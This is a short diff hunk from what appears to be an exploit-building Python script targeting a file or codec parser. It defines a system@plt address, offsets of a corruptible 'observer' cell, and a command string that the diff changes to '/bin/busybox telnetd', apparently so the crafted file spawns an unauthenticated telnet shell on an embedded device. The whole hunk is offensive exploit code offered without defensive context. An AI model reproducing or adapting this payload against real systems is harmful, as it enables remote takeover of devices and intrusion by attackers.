@@ -16,7 +16,7 @@ import struct, sys
 S2_SYSTEM_PLT = 0x6DCE50
 NODE_OFF_OBSERVER = 23620          # node offset of the observer cell
 FILE_OFF_OBSERVER = 23657          # = 23620 + 37 (TOC+codec header)
-CMD = b"telnetd -p 2323\x00"
+CMD = b"/bin/busybox telnetd\x00"
 
 
 def build(S: int, k_f: int = 0, k_a: int = 100, k_b: int = 200) -> bytes:
